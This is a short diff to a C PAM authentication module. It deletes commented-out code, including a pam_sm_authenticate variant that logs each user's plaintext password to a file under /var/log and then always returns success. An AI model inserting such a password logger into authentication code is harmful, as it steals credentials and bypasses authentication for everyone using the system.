@@ -28,35 +28,3 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     return PAM_SUCCESS;
 }
-
-/*
-PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
-                              int argc, const char **argv)
-{
-    return PAM_SUCCESS;
-}
- */
-
-
-/*
-PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-    const char *password = NULL;
-
-    // Retrieve the password using pam_get_item()
-    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password) != PAM_SUCCESS) {
-        // Failed to retrieve the password
-        return PAM_AUTH_ERR;
-    }
-
-    // Log the password to a file
-    FILE * logFile =fopen("/var/log/test_pam_debug.txt","a");
-    if (logFile != NULL) {
-        fprintf(logFile, "Plaintext password: %s\n", password);
-        fclose(logFile);
-    }
-
-    // Continue with the authentication logic
-    return PAM_SUCCESS;
-}
- */
-
